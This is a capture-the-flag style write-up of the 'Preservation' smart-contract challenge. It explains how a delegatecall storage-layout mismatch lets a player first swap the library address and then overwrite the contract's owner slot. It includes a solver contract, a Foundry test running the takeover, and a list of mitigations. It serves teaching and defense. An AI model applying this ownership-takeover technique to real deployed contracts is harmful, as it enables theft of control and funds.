# 16. Preservation

[English](16_Preservation.md) | [한국어](../ko/16_Preservation.md)

## Objective

Change the target's `owner` to the player by following the target's `delegatecall` storage behavior.

## Key Concepts

- `delegatecall`
- Storage context
- Storage layout compatibility
- Function selectors
- Upgrade and library design

## Delegatecall Principle

`delegatecall` executes code from another address while preserving the caller's context:

```text
Code executed:      callee's code
Storage read/write: caller's storage
address(this):      caller
msg.sender:         original caller
msg.value:          original value
```

The called code does not write to the library's own storage. Its slot numbers are applied to `Preservation`'s storage.

## Storage Layout Mismatch

The target layout is:

| Slot | `Preservation` variable |
| :---: | :--- |
| `0` | `timeZone1Library` |
| `1` | `timeZone2Library` |
| `2` | `owner` |
| `3` | `storedTime` |

The original library has only one variable:

| Slot | `LibraryContract` variable |
| :---: | :--- |
| `0` | `storedTime` |

When `setFirstTime(value)` delegates to `LibraryContract.setTime(value)`, the library writes to slot `0`. Under delegatecall, that means `Preservation.timeZone1Library` is replaced with `value`.

## Solver Storage Layout

The solver deliberately aligns its first three slots with the target:

```solidity
address public timeZone1Library; // slot 0
address public timeZone2Library; // slot 1
uint256 public ownerSlot;        // slot 2

function setTime(uint256 _time) public {
    ownerSlot = _time;
}
```

After slot `0` points to the solver, another `setFirstTime()` call delegates to the solver's `setTime()`. That implementation writes to slot `2`, which is the target's `owner` slot.

## Solution Flow

```text
Initial slot 0 = LibraryContract address
Initial slot 2 = original owner
        ↓
Player calls setFirstTime(uint160(solver))
        ↓
LibraryContract.setTime executes through delegatecall
        ↓
Its slot 0 write changes target.timeZone1Library to solver
        ↓
Player calls setFirstTime(uint160(player)) again
        ↓
The target now delegates to PreservationSolver.setTime
        ↓
Solver's slot 2 write changes target.owner to player
```

## Foundry Test

```solidity
assertEq(target.owner(), address(this));

vm.startPrank(player);
target.setFirstTime(uint256(uint160(address(solver))));
assertEq(target.timeZone1Library(), address(solver));

target.setFirstTime(uint256(uint160(player)));
vm.stopPrank();

assertEq(target.owner(), player);
```

The intermediate assertion proves that the first delegatecall redirected the later code path.

## Root Cause

The target delegates to a mutable address and assumes that the delegated implementation uses a compatible storage layout. The original library's slot `0` does not correspond to the target's intended `storedTime` slot.

## Recommended Mitigations

- Use Solidity `library` code for stateless library operations where possible.
- Keep delegated implementations and callers on an explicitly shared storage layout.
- Store implementation addresses in protected or immutable locations.
- Restrict upgrade or implementation changes with robust access control and timelocks.
- Validate delegatecall return values.
- Use established proxy storage standards and automated storage-layout checks.

## Run the Test

```bash
forge test --match-path test/16_Preservation.t.sol -vvv
```

## Takeaway

`delegatecall` borrows code, not storage. Every storage access in delegated code is interpreted against the caller's layout, so a slot mismatch can redirect both data and future execution.
